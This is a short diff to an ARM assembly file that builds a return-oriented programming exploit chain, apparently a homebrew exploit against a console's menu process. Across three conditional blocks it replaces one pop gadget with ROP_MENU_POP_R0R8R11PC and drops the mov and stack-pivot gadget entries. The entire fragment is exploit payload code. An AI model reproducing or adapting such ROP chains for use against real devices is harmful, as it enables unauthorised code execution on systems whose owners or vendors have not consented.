@@ -41,11 +41,9 @@ MENU_SLEEP equ ROP_MENU_SLEEPTHREAD
 			.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 				.word MENU_PAD ; r0 (PAD)
 .else
-			.word ROP_MENU_POP_R1PC
+			.word ROP_MENU_POP_R0R8R11PC
 				.word MENU_PAD
-			.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
 				.word 0xDEADBABE
-				.word ROP_MENU_STACK_PIVOT
 				.word 0xDEADBABE
 .endif
 			.word ROP_MENU_LDR_R0R0_POP_R4PC ; ldr r0, [r0] ; pop {r4, pc}
@@ -82,10 +80,8 @@ MENU_SLEEP equ ROP_MENU_SLEEPTHREAD
 			.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 				.word 0x00000001 ; r0 (flag)
 .else
-			.word ROP_MENU_POP_R1PC
+			.word ROP_MENU_POP_R0R8R11PC
 				.word 0x00000001
-			.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
-				.word MENU_OBJECT_LOC + 4 - object
 				.word 0xDEADBABE
 				.word 0xDEADBABE
 .endif
@@ -107,10 +103,8 @@ MENU_SLEEP equ ROP_MENU_SLEEPTHREAD
 			.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 				.word 0xFFFFFFFF ; r0
 .else
-			.word ROP_MENU_POP_R1PC
+			.word ROP_MENU_POP_R0R8R11PC
 				.word 0xFFFFFFFF
-			.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
-				.word 0xDEADBABE
 				.word 0xDEADBABE
 				.word 0xDEADBABE
 .endif
